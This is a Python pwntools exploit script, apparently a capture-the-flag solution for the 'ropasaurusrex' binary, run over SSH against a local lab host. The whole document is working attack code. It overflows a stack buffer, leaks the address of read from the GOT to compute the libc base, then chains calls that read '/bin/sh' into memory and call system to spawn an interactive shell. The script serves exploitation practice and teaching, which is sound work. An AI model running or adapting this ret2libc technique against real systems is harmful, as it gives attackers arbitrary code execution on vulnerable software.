from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
ssh = ssh("jinblack", "192.168.56.102")
r = ssh.process("./ropasaurusrex")
gdb.attach(r,'''
    # b *0x0804841c
''')
# context.log_level = "debug"

libc = ELF("./libc-2.27.so")


write_call = 0x08048442
write_fun = 0x0804830c
read_got = 0x0804961c
pop3 = 0x080484b6

main = 0x0804841d

payload = "A" * 140 
payload += p32(write_fun)
payload += p32(pop3)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)


raw_input("wait")

r.send(payload)
time.sleep(0.1)

read_libc = u32(r.recv(4))
libc_base = read_libc - libc.symbols["read"]
system_libc = libc_base + libc.symbols["system"]

print "leak read @ %#x" % read_libc
print "libc base @ %#x" % libc_base
print "system @ %#x" % system_libc

cmd = "/bin/sh\x00"

bss = 0x08049628

payload = "A" * 140 
payload += p32(read_libc)
payload += p32(pop3)
payload += p32(0) + p32(bss) + p32(len(cmd))
payload += p32(system_libc)
payload += "CCCC"
payload += p32(bss)

r.send(payload)
time.sleep(0.1)
r.send(cmd)

r.interactive()
